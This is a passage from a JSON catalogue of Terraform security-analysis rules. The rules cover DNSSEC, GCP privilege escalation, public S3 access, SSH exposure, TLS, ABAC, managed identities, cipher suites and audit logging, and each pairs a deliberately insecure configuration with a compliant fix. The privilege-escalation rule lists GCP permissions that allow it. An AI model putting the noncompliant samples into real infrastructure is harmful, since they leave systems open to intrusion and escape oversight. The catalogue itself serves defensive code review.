href=\"https://cloud.google.com/kms/docs/key-rotation\">GCP Documentation</a> - KMS Key rotation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6402": {
        "name": "Creating DNS zones without DNSSEC enabled is security-sensitive",
        "htmlDesc": "<p>Domain Name Systems (DNS) are vulnerable by default to various types of attacks.</p>\n<p>One of the biggest risks is DNS cache poisoning, which occurs when a DNS accepts spoofed DNS data, caches the malicious records, and potentially\nsends them later in response to legitimate DNS request lookups. This attack typically relies on the attacker’s <a\nhref=\"https://en.wikipedia.org/wiki/Man-in-the-middle_attack\">MITM</a> ability on the network and can be used to redirect users from an intended\nwebsite to a malicious website.</p>\n<p>To prevent these vulnerabilities, Domain Name System Security Extensions (DNSSEC) ensure the integrity and authenticity of DNS data by digitally\nsigning DNS zones.</p>\n<p>The public key of a DNS zone used to validate signatures can be trusted as DNSSEC is based on the following chain of trust:</p>\n<ul>\n  <li> The parent DNS zone adds a \"fingerprint\" of the public key of the child zone in a \"DS record\". </li>\n  <li> The parent DNS zone signs it with its own private key. </li>\n  <li> And this process continues until the root zone. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>The parent DNS zone (likely managed by the DNS registrar of the domain name) supports DNSSEC and</p>\n<ul>\n  <li> The DNS zone is public (contains data such as public reachable IP addresses). </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use DNSSEC when creating private and public DNS zones.</p>\n<p>Private DNS zones cannot be queried on the Internet and provide DNS name resolution for private networks. The risk of MITM attacks might be\nconsidered low on these networks and therefore implementing DNSSEC is still recommended but not with a high priority.</p>\n<p>Note: Choose a robust signing algorithm when setting up DNSSEC, such as <code>rsasha256</code>. The <a\nhref=\"https://en.wikipedia.org/wiki/SHA-1\">insecure</a> <code>rsasha1</code> algorithm should no longer be used.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"google_dns_managed_zone\" \"example\" { # Sensitive: dnssec_config is missing\n  name     = \"foobar\"\n  dns_name = \"foo.bar.\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"google_dns_managed_zone\" \"example\" {\n  name     = \"foobar\"\n  dns_name = \"foo.bar.\"\n\n  dnssec_config {\n    default_key_specs {\n      algorithm = \"rsasha256\"\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cloud.google.com/dns/docs/dnssec-config\">GCP Documentation</a> - Manage DNSSEC configuration </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/345\">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/353\">CWE-353 - Missing Support for Integrity Check</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6408": {
        "name": "Creating custom roles allowing privilege escalation is security-sensitive",
        "htmlDesc": "<p>Creating custom roles that allow privilege escalation can allow attackers to maliciously exploit an organization’s cloud resources.</p>\n<p>Certain GCP permissions allow impersonation of one or more privileged principals within a GCP infrastructure.<br> To prevent privilege escalation\nafter an account has been compromised, proactively follow GCP Security Insights and ensure that custom roles contain as few privileges as possible\nthat allow direct or indirect impersonation.</p>\n<p>For example, privileges like <code>deploymentmanager.deployments.create</code> allow impersonation of service accounts, even if the name does not\nsound like it.<br> Other privileges like <code>setIamPolicy</code>, which are more explicit, directly allow their holder to extend their\nprivileges.</p>\n<p>After gaining a foothold in the target infrastructure, sophisticated attackers typically map their newfound roles to understand what is\nexploitable.</p>\n<p>The riskiest privileges are either:</p>\n<ul>\n  <li> At the infrastructure level: privileges to perform project, folder, or organization-wide administrative tasks. </li>\n  <li> At the resource level: privileges to perform resource-wide administrative tasks. </li>\n</ul>\n<p>In either case, the following privileges should be avoided or granted only with caution:</p>\n<ul>\n  <li> <code><strong>.</strong>.setIamPolicy</code> </li>\n  <li> <code>cloudbuilds.builds.create</code> </li>\n  <li> <code>cloudfunctions.functions.create</code> </li>\n  <li> <code>cloudfunctions.functions.update</code> </li>\n  <li> <code>cloudscheduler.jobs.create</code> </li>\n  <li> <code>composer.environments.create</code> </li>\n  <li> <code>compute.instances.create</code> </li>\n  <li> <code>dataflow.jobs.create</code> </li>\n  <li> <code>dataproc.clusters.create</code> </li>\n  <li> <code>deploymentmanager.deployments.create</code> </li>\n  <li> <code>iam.roles.update</code> </li>\n  <li> <code>iam.serviceAccountKeys.create</code> </li>\n  <li> <code>iam.serviceAccounts.actAs</code> </li>\n  <li> <code>iam.serviceAccounts.getAccessToken</code> </li>\n  <li> <code>iam.serviceAccounts.getOpenIdToken</code> </li>\n  <li> <code>iam.serviceAccounts.implicitDelegation</code> </li>\n  <li> <code>iam.serviceAccounts.signBlob</code> </li>\n  <li> <code>iam.serviceAccounts.signJwt</code> </li>\n  <li> <code>orgpolicy.policy.set</code> </li>\n  <li> <code>run.services.create</code> </li>\n  <li> <code>serviceusage.apiKeys.create</code> </li>\n  <li> <code>serviceusage.apiKeys.list</code> </li>\n  <li> <code>storage.hmacKeys.create</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This role requires impersonation to perform specific tasks with different privileges. </li>\n  <li> This custom role is intended for a small group of administrators. </li>\n</ul>\n<p>There is a risk if you answered no to these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use a permission that does not allow privilege escalation.</p>\n<h2>Sensitive Code Example</h2>\n<p>Lightweight custom role intended for a developer:</p>\n<pre>\nresource \"google_organization_iam_custom_role\" \"example\" {\n  permissions = [\n    \"iam.serviceAccounts.getAccessToken\",     # Sensitive\n    \"iam.serviceAccounts.getOpenIdToken\",     # Sensitive\n    \"iam.serviceAccounts.actAs\",              # Sensitive\n    \"iam.serviceAccounts.implicitDelegation\", # Sensitive\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.create\",\n    \"run.services.delete\",\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.list\",\n    \"run.services.update\",\n  ]\n}\n</pre>\n<p>Lightweight custom role intended for a read-only user:</p>\n<pre>\nresource \"google_project_iam_custom_role\" \"example\" {\n  permissions = [\n    \"iam.serviceAccountKeys.create\",        # Sensitive\n    \"iam.serviceAccountKeys.get\",           # Sensitive\n    \"deploymentmanager.deployments.create\", # Sensitive\n    \"cloudbuild.builds.create\",             # Sensitive\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.list\",\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Lightweight custom role intended for a developer:</p>\n<pre>\nresource \"google_project_iam_custom_role\" \"example\" {\n  permissions = [\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.create\",\n    \"run.services.delete\",\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.list\",\n    \"run.services.update\",\n  ]\n}\n</pre>\n<p>Lightweight custom role intended for a read-only user:</p>\n<pre>\nresource \"google_project_iam_custom_role\" \"example\" {\n  permissions = [\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.list\",\n  ]\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cloud.google.com/iam/docs/custom-roles-permissions-support\">GCP IAM Docs</a> - Support levels for permissions in custom roles\n  </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-custom-roles\">GCP IAM Docs</a> - Understanding IAM custom roles </li>\n  <li> <a href=\"https://www.youtube.com/watch?v=Z-JFVJZ-HDA\">DEFONConference Youtube Video</a> - DEF CON Safe Mode - Dylan Ayrey and Allison Donovan -\n  Lateral Movement &amp; Privilege Escalation in GCP </li>\n  <li> <a href=\"https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/\">Rhino Security Labs</a> - Privilege Escalation\n  in Google Cloud Platform - Part 1 (IAM) </li>\n  <li> <a href=\"https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/\">Rhino Security Labs</a> - Privilege\n  Escalation in Google Cloud Platform - Part 2 (Non-IAM) </li>\n  <li> <a href=\"https://www.praetorian.com/blog/google-cloud-platform-gcp-service-account-based-privilege-escalation-paths/\">Praetorian</a> - Google\n  Cloud Platform (GCP) Service Account-based Privilege Escalation paths </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/manage-policy-insights\">GCP Docs</a> - Security Insights </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6281": {
        "name": "Allowing public ACLs or policies on a S3 bucket is security-sensitive",
        "htmlDesc": "<p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>\n<p>This access control can be relaxed with ACLs or policies.</p>\n<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>\n<ul>\n  <li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>\n  <li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>\n  <li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>\n  <li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket\n  owner account. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>\n  <li> These settings are not already enforced to true at the account level. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to configure:</p>\n<ul>\n  <li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li>\n  <li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li>\n  <li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li>\n  <li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>By default, when not set, the <code>aws_s3_bucket_public_access_block</code> is fully deactivated (nothing is blocked):</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" { # Sensitive: no Public Access Block defined for this bucket\n  bucket = \"example\"\n}\n</pre>\n<p>This <code>aws_s3_bucket_public_access_block</code> allows public ACL to be set:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {  # Sensitive\n  bucket = \"examplename\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example-public-access-block\" {\n  bucket = aws_s3_bucket.example.id\n\n  block_public_acls       = false # should be true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>This <code>aws_s3_bucket_public_access_block</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public\npolicies:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example-public-access-block\" {\n  bucket = aws_s3_bucket.example.id\n\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\">AWS Documentation</a> - Blocking public\n  access to your Amazon S3 storage </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "terraform:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and\noutbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services\ntraditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>An ingress rule allowing all inbound SSH traffic for AWS:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"aws_security_group\" \"noncompliant\" {\n  name        = \"allow_ssh_noncompliant\"\n  description = \"allow_ssh_noncompliant\"\n  vpc_id      = aws_vpc.main.id\n\n  ingress {\n    description      = \"SSH rule\"\n    from_port        = 22\n    to_port          = 22\n    protocol         = \"tcp\"\n    cidr_blocks      = [\"0.0.0.0/0\"]  # Noncompliant\n  }\n}\n</pre>\n<p>A security rule allowing all inbound SSH traffic for Azure:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"azurerm_network_security_rule\" \"noncompliant\" {\n  priority                    = 100\n  direction                   = \"Inbound\"\n  access                      = \"Allow\"\n  protocol                    = \"Tcp\"\n  source_port_range           = \"*\"\n  destination_port_range      = \"22\"\n  source_address_prefix       = \"*\"  # Noncompliant\n  destination_address_prefix  = \"*\"\n}\n</pre>\n<p>A firewall rule allowing all inbound SSH traffic for GCP:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource \"google_compute_firewall\" \"noncompliant\" {\n  network = google_compute_network.default.name\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]  # Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>An ingress rule allowing inbound SSH traffic from specific IP addresses for AWS:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"aws_security_group\" \"compliant\" {\n  name        = \"allow_ssh_compliant\"\n  description = \"allow_ssh_compliant\"\n  vpc_id      = aws_vpc.main.id\n\n  ingress {\n    description      = \"SSH rule\"\n    from_port        = 22\n    to_port          = 22\n    protocol         = \"tcp\"\n    cidr_blocks      = [\"1.2.3.0/24\"]\n  }\n}\n</pre>\n<p>A security rule allowing inbound SSH traffic from specific IP addresses for Azure:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_network_security_rule\" \"compliant\" {\n  priority                    = 100\n  direction                   = \"Inbound\"\n  access                      = \"Allow\"\n  protocol                    = \"Tcp\"\n  source_port_range           = \"*\"\n  destination_port_range      = \"22\"\n  source_address_prefix       = \"1.2.3.0\"\n  destination_address_prefix  = \"*\"\n}\n</pre>\n<p>A firewall rule allowing inbound SSH traffic from specific IP addresses for GCP:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource \"google_compute_firewall\" \"compliant\" {\n  network = google_compute_network.default.name\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"10.0.0.1/32\"]\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "terraform:S6407": {
        "name": "Creating App Engine handlers without requiring TLS is security-sensitive",
        "htmlDesc": "<p>App Engine supports encryption in transit through TLS. As soon as the app is deployed, it can be requested using <code>appspot.com</code> domains\nor custom domains. By default, endpoints accept both clear-text and encrypted traffic. When communication isn’t encrypted, there is a risk that an\nattacker could intercept it and read confidential information.</p>\n<p>When creating an App Engine, request handlers can be set with different security level for encryption:</p>\n<ul>\n  <li> <code>SECURE_NEVER</code>: only HTTP requests are allowed (HTTPS requests are redirected to HTTP). </li>\n  <li> <code>SECURE_OPTIONAL</code> and <code>SECURE_DEFAULT</code>: both HTTP and HTTPS requests are allowed. </li>\n  <li> <code>SECURE_ALWAYS</code>: only HTTPS requests are allowed (HTTP requests are redirected to HTTPS). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The handler serves confidential data in HTTP responses. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended for App Engine handlers to require TLS for all traffic. It can be achieved by setting the security level to\n<code>SECURE_ALWAYS</code>.</p>\n<h2>Sensitive Code Example</h2>\n<p><code>SECURE_DEFAULT</code>, <code>SECURE_NEVER</code> and <code>SECURE_OPTIONAL</code> are sensitive TLS security level:</p>\n<pre>\nresource \"google_app_engine_standard_app_version\" \"example\" {\n  version_id = \"v1\"\n  service    = \"default\"\n  runtime    = \"nodejs\"\n\n  handlers {\n    url_regex                   = \".*\"\n    redirect_http_response_code = \"REDIRECT_HTTP_RESPONSE_CODE_301\"\n    security_level              = \"SECURE_OPTIONAL\" # Sensitive\n    script {\n      script_path = \"auto\"\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Force the use of TLS for the handler by setting the security level on <code>SECURE_ALWAYS</code>:</p>\n<pre>\nresource \"google_app_engine_standard_app_version\" \"example\" {\n  version_id = \"v1\"\n  service    = \"default\"\n  runtime    = \"nodejs\"\n\n  handlers {\n    url_regex                   = \".*\"\n    redirect_http_response_code = \"REDIRECT_HTTP_RESPONSE_CODE_301\"\n    security_level              = \"SECURE_ALWAYS\"\n    script {\n      script_path = \"auto\"\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://cloud.google.com/appengine/docs/standard/nodejs/application-security\">GCP Documentation</a> - Overview of App Security </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6409": {
        "name": "Enabling Attribute-Based Access Control for Kubernetes is security-sensitive",
        "htmlDesc": "<p>Enabling Legacy Authorization, Attribute-Based Access Control (ABAC), on Google Kubernetes Engine resources can reduce an organization’s ability to\nprotect itself against access controls being compromised.</p>\n<p>For Kubernetes, Attribute-Based Access Control has been superseded by Role-Based Access Control. ABAC is not under active development anymore and\nthus should be avoided.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This resource is essential for the information system infrastructure. </li>\n  <li> This resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Unless you are relying on ABAC, leave it disabled.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://cloud.google.com/kubernetes-engine\">Google Kubernetes Engine</a>:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  enable_legacy_abac = true # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://cloud.google.com/kubernetes-engine\">Google Kubernetes Engine</a>:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  enable_legacy_abac = false\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n  <li> <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled\">Google Cloud Documentation</a> -\n  Hardening your cluster’s security </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6378": {
        "name": "Disabling Managed Identities for Azure resources is security-sensitive",
        "htmlDesc": "<p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credential leaks.</p>\n<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:\nsecrets used by Azure are not even accessible to end-users.</p>\n<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,\nconfiguration faults may also happen when storing these values or assigning them permissions.</p>\n<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials\nmanagement.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The resource:</p>\n<ul>\n  <li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li>\n  <li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li>\n</ul>\n<p>There is a risk if you answered yes to all of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>\n<ul>\n  <li> It cannot be shared across resources. </li>\n  <li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li>\n  <li> It provides a unique independent identity. </li>\n</ul>\n<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>\n<h2>Sensitive Code Example</h2>\n<p>For Typical identity blocks:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_api_management\" \"example\" { # Sensitive, the identity block is missing\n  name           = \"example\"\n  publisher_name = \"company\"\n}\n</pre>\n<p>For connections between Kusto Clusters and Azure Data Factory:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"azurerm_data_factory_linked_service_kusto\" \"example\" {\n  name                 = \"example\"\n  use_managed_identity = false # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For Typical identity blocks:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_api_management\" \"example\" {\n  name           = \"example\"\n  publisher_name = \"company\"\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n</pre>\n<p>For connections between Kusto Clusters and Azure Data Factory:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_data_factory_linked_service_kusto\" \"example\" {\n  name                 = \"example\"\n  use_managed_identity = true\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview\">Azure AD Documentation - Managed\n  Identities Overview</a> </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations\">Azure AD Documentation - Managed Identities Best Practices</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities\">Azure\n  AD Documentation - Services that support managed identities</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6410": {
        "name": "Google Cloud load balancers SSL policies should not offer weak cipher suites",
        "htmlDesc": "<p>The TLS configuration of Google Cloud load balancers is defined through SSL policies.</p>\n<h2>Why is this an issue?</h2>\n<p>There are three managed profiles to choose from: <code>COMPATIBLE</code> (default), <code>MODERN</code> and <code>RESTRICTED</code>:</p>\n<ul>\n  <li> The <code>RESTRICTED</code> profile supports a reduced set of cryptographic algorithms, intended to meet stricter compliance requirements.\n  </li>\n  <li> The <code>MODERN</code> profile supports a wider set of cryptographic algorithms, allowing most modern clients to negotiate TLS. </li>\n  <li> The <code>COMPATIBLE</code> profile supports the widest set of cryptographic algorithms, allowing connections from older client applications.\n  </li>\n</ul>\n<p>The <code>MODERN</code> and <code>COMPATIBLE</code> profiles allow the use of older cryptographic algorithms that are no longer considered secure\nand are susceptible to attack.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker may be able to force the use of the insecure cryptographic algorithms, downgrading the security of the connection. This allows them to\ncompromise the confidentiality or integrity of the data being transmitted.</p>\n<p>The <code>MODERN</code> profile allows the use of the insecure SHA-1 signing algorithm. An attacker is able to generate forged data that passes a\nsignature check, appearing to be legitimate data.</p>\n<p>The <code>COMPATIBLE</code> profile additionally allows the user of key exchange algorithms that do not support <a\nhref=\"https://en.wikipedia.org/wiki/Forward_secrecy\">forward secrecy</a> as a feature. If the server’s private key is leaked, it can be used to\ndecrypt all network traffic sent to and from that server.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"google_compute_ssl_policy\" \"example\" {\n  name            = \"example\"\n  min_tls_version = \"TLS_1_2\"\n  profile         = \"COMPATIBLE\" # Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"google_compute_ssl_policy\" \"example\" {\n  name            = \"example\"\n  min_tls_version = \"TLS_1_2\"\n  profile         = \"RESTRICTED\"\n}\n</pre>\n<h3>How does this work?</h3>\n<p>If an attacker is able to intercept and modify network traffic, they can filter the list of algorithms sent between the client and the server. By\nremoving all secure algorithms from the list, the attacker can force the use of any insecure algorithms that remain.</p>\n<p>The <code>RESTRICTED</code> profile only allows strong cryptographic algorithms to be used. There are no insecure algorithms that can compromise\nthe security of the connection.</p>\n<h3>Pitfalls</h3>\n<p>Older client applications may not support the algorithms required by the <code>RESTRICTED</code> profile. These applications will no longer be able\nto connect.</p>\n<p>If the <code>MODERN</code> or <code>COMPATIBLE</code> profiles must be used so that older clients can connect, consider using additional measures\nsuch as TLS client certificates or IP allow-lists to improve security.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> SSL Labs - <a href=\"https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#23-use-secure-cipher-suites\">SSL and TLS\n  Deployment Best Practices</a> - Use Secure Cipher Suites </li>\n  <li> Google - <a href=\"https://cloud.google.com/load-balancing/docs/ssl-policies-concepts#defining_an_ssl_policy\">Google Cloud Load Balancing</a> -\n  Defining an SSL policy </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6414": {
        "name": "Excluding users or groups activities from audit logs is security-sensitive",
        "htmlDesc": "<p>The Google Cloud audit logs service records administrative activities and accesses to Google Cloud resources of the project. It is important to\nenable audit logs to be able to investigate malicious activities in the event of a security incident.</p>\n<p>Some project members may be exempted from having their activities recorded in the Google Cloud audit log service, creating a blind spot and\nreducing the capacity to investigate future security events.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The members exempted from having their activity logged have high privileges. </li>\n  <li> Compliance rules require that audit log should be activated for all members. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to have a consistent audit logging policy for all project members and therefore not to create logging exemptions for certain\nmembers.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"google_project_iam_audit_config\" \"example\" {\n  project = data.google_project.project.id\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n    exempted_members = [ # Sensitive\n      \"user:rogue.administrator@gmail.com\",\n    ]\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"google_project_iam_audit_config\" \"example\" {\n  project = data.google_project.project.id\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cloud.google.com/logging/docs/audit\">GCP Documentation</a> - Cloud Audit Logs overview </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6258": {
        "name": "Disabling logging is security-sensitive",
        "htmlDesc": "<p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>\n<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage\nenables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>\n<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will\nallow investigators to establish a timeline of the actions perpetrated by an attacker.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require this component to be monitored. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage\ncomponents.<br> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load\nBalancer Access Logs <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html\">require an additional\nbucket policy</a>.</p>\n<h2>Sensitive Code Example</h2>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\">S3 access 